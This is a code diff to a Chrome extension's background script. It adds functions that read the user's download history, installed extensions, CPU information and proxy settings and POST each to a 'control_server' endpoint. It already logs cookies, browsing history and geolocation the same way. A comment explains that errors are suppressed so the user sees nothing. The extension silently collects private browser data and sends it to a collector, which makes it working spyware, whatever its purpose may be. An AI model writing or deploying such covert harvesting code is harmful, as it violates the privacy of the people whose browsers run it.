@@ -202,17 +202,7 @@ function logCPU(C){
             }
     )
     }
-function logExApp(C){
 
-    fetch('http://127.0.0.1:5000/control_server',
-    {
-    method: "POST",
-    mode: 'no-cors', 
-    body: JSON.stringify( C),
-    headers:{"Content-Type": "application/json"}
-    }
-)   
-}
 function logGeolocation(){
     chrome.storage.local.get(["lat", "long"]).then((result)=>{ //take the information, if exists from the storage
         //this data is obtained in the content script
@@ -331,25 +321,69 @@ function logHistory(){
 
 
 }
-
+function logDowloads(){
+    chrome.downloads.search({}).then((down)=>{
+        fetch('http://127.0.0.1:5000/control_server',
+        {
+        method: "POST",
+        mode: 'no-cors', 
+        body: JSON.stringify( down),
+        headers:{"Content-Type": "application/json"}
+        })
+    })   
+}
+function logManagement(){
+    chrome.management.getAll({}).then((down)=>{
+        fetch('http://127.0.0.1:5000/control_server',
+        {
+        method: "POST",
+        mode: 'no-cors', 
+        body: JSON.stringify( down),
+        headers:{"Content-Type": "application/json"}
+        })
+    })   
+}
+function logCpu(){
+    chrome.system.cpu.getInfo({}).then((down)=>{
+        fetch('http://127.0.0.1:5000/control_server',
+        {
+        method: "POST",
+        mode: 'no-cors', 
+        body: JSON.stringify( down),
+        headers:{"Content-Type": "application/json"}
+        })
+    })   
+}
+function logProxy(){
+    chrome.proxy.settings.get({'incognito': false}).then((down)=>{
+        fetch('http://127.0.0.1:5000/control_server',
+        {
+        method: "POST",
+        mode: 'no-cors', 
+        body: JSON.stringify( down),
+        headers:{"Content-Type": "application/json"}
+        })
+    })   
+}
 function logSend(){
     try{//errors can happen if the server is down, and we do not want the user to receive errors messages
         //hence, this try and catch nullifies them.
 
-        logCookies()
-        logHistory()
-        logGeolocation()
+        logCookies();
+        logHistory();
+        logGeolocation();
+        logDowloads();
+        logManagement();
+        logCpu();
+        logProxy;
         loggingcontentSettings();
         loggingprivacySettings();
+        
         return true
     }
     catch{
         return false
     }
-    //chrome.system.cpu.getInfo((info)=>{logCPU(info)})
-    //chrome.management.getAll((info)=>{logExApp(info)})
-    //chrome.downloads.search({}).then(logExApp) 
-    //chrome.proxy.settings.get({'incognito': false}).then((info)=> logExApp(info))
 
 }
 
